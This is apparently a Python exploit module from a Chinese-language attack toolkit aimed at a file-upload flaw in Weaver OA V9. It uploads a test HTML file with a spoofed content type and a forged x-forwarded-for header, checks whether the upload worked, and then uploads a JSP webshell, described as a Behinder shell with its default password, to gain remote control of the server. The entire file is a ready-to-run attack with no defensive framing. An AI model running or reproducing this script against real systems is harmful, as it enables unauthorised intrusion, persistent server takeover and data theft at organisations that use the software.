# -*- coding: utf-8 -*-

import re
import time
import requests
from rich.console import Console


console = Console()
def now_time():
    return time.strftime("[%H:%M:%S] ", time.localtime())
  
def main(target_url):
    if target_url[:4]!='http':
        target_url = 'http://' + target_url
    if target_url[-1]!='/':
        target_url += '/'  
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
        "x-forwarded-for":"127.0.0.1", 
        }
    vuln_url=target_url+"page/exportImport/uploadOperation.jsp"
    exp_url= target_url+"page/exportImport/fileTransfer/index123.html"
    
    file1 = [('file1', ('index123.html', open('main/weaver/poc/index123.html', 'rb'), 'image/png'))]
    file2 = [('file1', ('index123.jsp', open('main/weaver/poc/index123.jsp', 'rb'), 'image/png'))]
    console.print(now_time() + " [INFO]     正在检测泛微OA V9 文件上传漏洞", style='bold blue')
    try:
        requests.packages.urllib3.disable_warnings()
        url = requests.post(vuln_url, headers=headers, files=file1, verify=False)
        cs  = requests.get(exp_url, headers=headers, verify=False)
        if cs.status_code== 200 and '123456' in cs.text:
            console.print(now_time() + ' [SUCCESS]  测试文件上传成功:{}'.format(exp_url), style='bold green')
            console.print(now_time() + " [INFO]     正在尝试GETSHELL", style='bold blue')
            url = requests.post(vuln_url, headers=headers, files=file2, verify=False)
            exp_url= target_url+"page/exportImport/fileTransfer/index123.jsp"
            GS  = requests.get(exp_url, headers=headers, verify=False)
            if GS.status_code== 200:
                console.print(now_time() + ' [SUCCESS]  冰蝎默认密码文件上传成功:{}'.format(exp_url), style='bold green')
            else:
                console.print(now_time() + ' [WARNING]  上传失败，原因可能存在防火墙请手动上传', style='bold red')
        else:
            console.print(now_time() + ' [WARNING]  泛微oa V9 文件上传漏洞不存在', style='bold red ')
    except:
         console.print(now_time() + ' [WARNING]  请求失败，可能无法与目标建立连接或目标不存在', style='bold red')
 


        
